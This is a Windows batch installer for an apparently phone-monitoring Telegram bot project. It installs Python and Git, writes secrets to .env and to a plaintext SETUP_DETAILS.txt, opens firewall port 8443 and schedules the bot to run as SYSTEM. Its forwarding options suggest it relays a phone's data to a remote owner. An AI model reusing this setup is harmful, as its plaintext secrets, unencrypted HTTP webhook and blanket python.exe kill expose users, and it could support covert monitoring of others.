@echo off
setlocal enabledelayedexpansion
title Phone Monitor — One Click Setup
color 0A

echo.
echo ============================================
echo   PHONE MONITOR — ONE CLICK SETUP
echo ============================================
echo.

:: ─────────────────────────────────────────
:: STEP 1 — CHECK ADMIN RIGHTS
:: ─────────────────────────────────────────
net session >nul 2>&1
if %errorLevel% NEQ 0 (
    echo [!] Please run this file as Administrator
    echo [!] Right click setup.bat and select Run as Administrator
    pause
    exit /b 1
)
echo [OK] Running as Administrator

:: ─────────────────────────────────────────
:: STEP 2 — CHECK AND INSTALL PYTHON
:: ─────────────────────────────────────────
echo.
echo [..] Checking Python...
python --version >nul 2>&1
if %errorLevel% NEQ 0 (
    echo [..] Python not found. Installing Python 3.11...
    winget install Python.Python.3.11 --silent --accept-package-agreements --accept-source-agreements
    if %errorLevel% NEQ 0 (
        echo [..] Trying alternate install method...
        curl -o python_installer.exe https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe
        python_installer.exe /quiet InstallAllUsers=1 PrependPath=1
        del python_installer.exe
    )
    echo [OK] Python installed
) else (
    echo [OK] Python already installed
)

:: ─────────────────────────────────────────
:: STEP 3 — CHECK AND INSTALL GIT
:: ─────────────────────────────────────────
echo.
echo [..] Checking Git...
git --version >nul 2>&1
if %errorLevel% NEQ 0 (
    echo [..] Git not found. Installing Git...
    winget install Git.Git --silent --accept-package-agreements --accept-source-agreements
    echo [OK] Git installed
) else (
    echo [OK] Git already installed
)

:: ─────────────────────────────────────────
:: STEP 4 — COLLECT USER INPUT
:: ─────────────────────────────────────────
echo.
echo ============================================
echo   ENTER YOUR DETAILS
echo ============================================
echo.

set /p BOT_TOKEN="Enter your BOT_TOKEN: "
if "!BOT_TOKEN!"=="" (
    echo [!] BOT_TOKEN cannot be empty
    pause
    exit /b 1
)

set /p OWNER_ID="Enter your OWNER_ID: "
if "!OWNER_ID!"=="" (
    echo [!] OWNER_ID cannot be empty
    pause
    exit /b 1
)

set /p SECRET_TOKEN="Enter SECRET_TOKEN (press Enter to auto-generate): "
if "!SECRET_TOKEN!"=="" (
    for /f "delims=" %%i in ('python -c "import secrets; print(secrets.token_hex(16))"') do set SECRET_TOKEN=%%i
    echo [OK] SECRET_TOKEN auto-generated: !SECRET_TOKEN!
)

set /p DB_KEY="Enter DB_ENCRYPTION_KEY (press Enter to auto-generate): "
if "!DB_KEY!"=="" (
    for /f "delims=" %%i in ('python -c "import secrets; print(secrets.token_hex(16))"') do set DB_KEY=%%i
    echo [OK] DB_ENCRYPTION_KEY auto-generated: !DB_KEY!
)

:: ─────────────────────────────────────────
:: STEP 5 — GET PUBLIC IP AUTOMATICALLY
:: ─────────────────────────────────────────
echo.
echo [..] Detecting your public IP...
for /f "delims=" %%i in ('curl -s ifconfig.me') do set PUBLIC_IP=%%i
if "!PUBLIC_IP!"=="" (
    for /f "delims=" %%i in ('curl -s api.ipify.org') do set PUBLIC_IP=%%i
)
if "!PUBLIC_IP!"=="" (
    for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr /i "IPv4"') do (
        set PUBLIC_IP=%%i
        set PUBLIC_IP=!PUBLIC_IP: =!
    )
)
echo [OK] IP detected: !PUBLIC_IP!
set WEBHOOK_URL=http://!PUBLIC_IP!:8443

:: ─────────────────────────────────────────
:: STEP 6 — SET UP PROJECT FOLDER
:: ─────────────────────────────────────────
echo.
echo [..] Setting up project folder...
set PROJECT_DIR=%USERPROFILE%\Desktop\PhoneMonitor
if not exist "!PROJECT_DIR!" (
    mkdir "!PROJECT_DIR!"
)
cd /d "!PROJECT_DIR!"
echo [OK] Project folder: !PROJECT_DIR!

:: ─────────────────────────────────────────
:: STEP 7 — COPY PROJECT FILES
:: ─────────────────────────────────────────
echo.
echo [..] Copying project files...
:: Copy all files from same directory as setup.bat
set SCRIPT_DIR=%~dp0
xcopy "!SCRIPT_DIR!bot" "!PROJECT_DIR!\bot" /E /I /Q /Y >nul
xcopy "!SCRIPT_DIR!android" "!PROJECT_DIR!\android" /E /I /Q /Y >nul
copy "!SCRIPT_DIR!requirements.txt" "!PROJECT_DIR!\" /Y >nul
copy "!SCRIPT_DIR!Procfile" "!PROJECT_DIR!\" /Y >nul
copy "!SCRIPT_DIR!runtime.txt" "!PROJECT_DIR!\" /Y >nul
echo [OK] Project files copied

:: ─────────────────────────────────────────
:: STEP 8 — CREATE .env FILE AUTOMATICALLY
:: ─────────────────────────────────────────
echo.
echo [..] Creating .env file...
(
echo BOT_TOKEN=!BOT_TOKEN!
echo OWNER_ID=!OWNER_ID!
echo WEBHOOK_URL=!WEBHOOK_URL!
echo SECRET_TOKEN=!SECRET_TOKEN!
echo DB_ENCRYPTION_KEY=!DB_KEY!
echo DB_PATH=data/bot_database.db
echo ENABLE_NUMBER_FORWARD=false
echo FORWARD_TO_NUMBER=
echo ENABLE_TG_FORWARD=false
echo FORWARD_TO_TG_ID=
echo MAX_RETRY_ATTEMPTS=3
echo RETRY_DELAY_SECONDS=5
echo QUEUE_SYNC_INTERVAL=30
echo VIEWER_ENABLED=true
echo NOTIFICATION_ENABLED=true
echo WEBHOOK_PORT=8443
) > "!PROJECT_DIR!\.env"
echo [OK] .env file created

:: ─────────────────────────────────────────
:: STEP 9 — CREATE DATA FOLDER
:: ─────────────────────────────────────────
echo.
echo [..] Creating data folder...
if not exist "!PROJECT_DIR!\data" mkdir "!PROJECT_DIR!\data"
echo [OK] Data folder created

:: ─────────────────────────────────────────
:: STEP 9B — CLEAR PYTHON CACHE
:: ─────────────────────────────────────────
echo [..] Clearing Python cache...
for /r "!PROJECT_DIR!" %%d in (__pycache__) do (
    if exist "%%d" rd /s /q "%%d" 2>nul
)
del /s /q "!PROJECT_DIR!\*.pyc" 2>nul
echo [OK] Python cache cleared

:: ─────────────────────────────────────────
:: STEP 10 — INSTALL PYTHON DEPENDENCIES
:: ─────────────────────────────────────────
echo.
echo [..] Installing Python dependencies...
echo [..] This may take 2-3 minutes...
pip install python-dotenv --quiet
pip install -r "!PROJECT_DIR!\requirements.txt" --quiet
if %errorLevel% NEQ 0 (
    echo [!] Some packages failed. Trying again...
    pip install python-dotenv
    pip install -r "!PROJECT_DIR!\requirements.txt"
)
echo [OK] All dependencies installed

:: ─────────────────────────────────────────
:: STEP 11 — OPEN FIREWALL PORT 8443
:: ─────────────────────────────────────────
echo.
echo [..] Opening firewall port 8443...
netsh advfirewall firewall delete rule name="PhoneMonitor" >nul 2>&1
netsh advfirewall firewall add rule name="PhoneMonitor" dir=in action=allow protocol=TCP localport=8443
echo [OK] Firewall port 8443 opened

:: ─────────────────────────────────────────
:: STEP 12 — CREATE START BOT SCRIPT
:: ─────────────────────────────────────────
echo.
echo [..] Creating start_bot.bat...
(
echo @echo off
echo title Phone Monitor Bot
echo cd /d %USERPROFILE%\Desktop\PhoneMonitor
echo python -m bot.main
echo pause
) > "!PROJECT_DIR!\start_bot.bat"

:: ─────────────────────────────────────────
:: STEP 13 — CREATE RESTART BOT SCRIPT
:: ─────────────────────────────────────────
(
echo @echo off
echo title Restarting Phone Monitor Bot
echo taskkill /f /im python.exe >nul 2>&1
echo timeout /t 2 /nobreak >nul
echo cd /d %USERPROFILE%\Desktop\PhoneMonitor
echo start pythonw -m bot.main
echo echo Bot restarted successfully
echo timeout /t 3
) > "!PROJECT_DIR!\restart_bot.bat"

:: ─────────────────────────────────────────
:: STEP 14 — CREATE STOP BOT SCRIPT
:: ─────────────────────────────────────────
(
echo @echo off
echo title Stopping Phone Monitor Bot
echo taskkill /f /im python.exe
echo echo Bot stopped
echo timeout /t 3
) > "!PROJECT_DIR!\stop_bot.bat"
echo [OK] Control scripts created

:: ─────────────────────────────────────────
:: STEP 15 — SET UP TASK SCHEDULER
:: Auto starts bot when RDP boots
:: ─────────────────────────────────────────
echo.
echo [..] Setting up auto-start on boot...
schtasks /delete /tn "PhoneMonitorBot" /f >nul 2>&1
schtasks /create /tn "PhoneMonitorBot" /tr "cmd /c cd /d !PROJECT_DIR! && python -m bot.main" /sc onlogon /ru SYSTEM /rl highest /f
if %errorLevel% NEQ 0 (
    echo [!] Task Scheduler setup failed — bot will need manual start after reboot
) else (
    echo [OK] Auto-start on boot configured
)

:: ─────────────────────────────────────────
:: STEP 16 — SAVE SETUP DETAILS
:: ─────────────────────────────────────────
echo.
echo [..] Saving setup details...
(
echo ============================================
echo   PHONE MONITOR SETUP DETAILS
echo   Save this file securely
echo ============================================
echo.
echo BOT_TOKEN:          !BOT_TOKEN!
echo OWNER_ID:           !OWNER_ID!
echo SECRET_TOKEN:       !SECRET_TOKEN!
echo DB_KEY:             !DB_KEY!
echo WEBHOOK_URL:        !WEBHOOK_URL!
echo PROJECT_DIR:        !PROJECT_DIR!
echo.
echo CONTROL SCRIPTS:
echo Start bot:    double-click start_bot.bat
echo Stop bot:     double-click stop_bot.bat
echo Restart bot:  double-click restart_bot.bat
echo.
echo GITHUB SECRETS TO ADD:
echo BOT_TOKEN       = !BOT_TOKEN!
echo OWNER_ID        = !OWNER_ID!
echo WEBHOOK_URL     = !WEBHOOK_URL!
echo SECRET_TOKEN    = !SECRET_TOKEN!
echo DB_ENCRYPTION_KEY = !DB_KEY!
) > "!PROJECT_DIR!\SETUP_DETAILS.txt"
echo [OK] Setup details saved to SETUP_DETAILS.txt

:: ─────────────────────────────────────────
:: STEP 17 — START BOT
:: ─────────────────────────────────────────
echo.
echo ============================================
echo   STARTING BOT
echo ============================================
echo.
echo [..] Starting Phone Monitor Bot...
cd /d "!PROJECT_DIR!"
start "Phone Monitor Bot" cmd /k "python -m bot.main"
timeout /t 5 /nobreak >nul

:: ─────────────────────────────────────────
:: STEP 18 — OPEN TELEGRAM
:: ─────────────────────────────────────────
echo [..] Opening Telegram...
start https://t.me/!BOT_TOKEN:~0,10!

:: ─────────────────────────────────────────
:: DONE
:: ─────────────────────────────────────────
echo.
echo ============================================
echo   SETUP COMPLETE
echo ============================================
echo.
echo [OK] Bot is now running on: !WEBHOOK_URL!
echo [OK] Open Telegram and send /start to your bot
echo [OK] All details saved in SETUP_DETAILS.txt
echo.
echo NEXT STEPS:
echo 1. Open Telegram - send /start to your bot
echo 2. Add GitHub Secrets from SETUP_DETAILS.txt
echo 3. Run APK build on GitHub Actions
echo 4. Set up UptimeRobot to monitor: !WEBHOOK_URL!
echo.
echo Bot window is running in background.
echo Do NOT close the bot window.
echo.
pause
